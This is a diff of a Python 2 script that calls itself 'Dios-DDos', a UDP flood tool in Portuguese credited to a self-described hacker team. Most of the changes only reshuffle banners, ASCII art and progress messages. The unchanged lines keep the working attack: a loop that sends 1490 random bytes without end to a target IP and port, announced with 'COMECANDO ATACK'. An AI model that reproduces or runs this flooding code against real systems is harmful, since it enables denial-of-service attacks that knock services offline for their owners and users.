@@ -3,14 +3,6 @@ import os
 import time
 import socket
 import random
-#dios ddos
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
 
 #cores
 Azul = '\033[94m'
@@ -19,10 +11,19 @@ Amarelo = '\033[93m'
 Vermelho = '\033[91m'
 Fim = '\033[0m'
 
-##############
+#time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+#sock
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-############
+#logo
 
 os.system("clear")
 print "\033[92m========================================\033[0m"
@@ -36,14 +37,7 @@ print "\033[92m=  ====  ==  ====  ==  ====  ==  ====  =\033[0m"
 print "\033[92m=  ====  ==  ====  ===  ==  ===  ====  =\033[0m"
 print "\033[92m=       ===       =====    =====      ==\033[0m"
 print "\033[92m========================================\033[0m"
-print '''____       ______      _____       ____       
-/\  _`\    /\__  _\    /\  __`\    /\  _`\     
-\ \ \/\ \  \/_/\ \/    \ \ \/\ \   \ \,\L\_\   
- \ \ \ \ \    \ \ \     \ \ \ \ \   \/_\__ \   
-  \ \ \_\ \    \_\ \__   \ \ \_\ \    /\ \L\ \ 
-   \ \____/    /\_____\   \ \_____\   \ `\____\
-'''
-print "https://github.com/DiosDeLaWeb/Dios-DDos"
+print "     https://github.com/DiosDeLaWeb/Dios-DDos"
 print
 print "codder by: dios de la web   #dono do script"
 print "new team 404                #melhor team hacker"
@@ -63,16 +57,10 @@ print "\033[92m| | | | | | | | | \___ \  | |  _| | | |\033[0m"
 print "\033[92m| |_| | |_| | |_| |___) | | |_| | |_| |\033[0m"
 print "\033[92m|____/|____/ \___/|____/   \____|\___/\033[0m"
 print
-print "[                                   ] 0% "
+print "[+] \033[92mPREPARANDO...\033[0m"
 time.sleep(5)
-print "[\033[92m>>>>>>>>>>\033[0m                         ] 25% "
+print "[+] \033[92mCOMECANDO ATACK\033[0m "
 time.sleep(5)
-print "[\033[92m>>>>>>>>>>>>>>>>>>\033[0m                 ] 50% "
-time.sleep(5)
-print "[\033[92m>>>>>>>>>>>>>>>>>>>>>>>>>>\033[0m         ] 75% "
-time.sleep(5)
-print "[\033[92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\033[0m] 100% "
-time.sleep(3)
 sent = 0
 while True:
     sock.sendto(bytes, (ip,port))
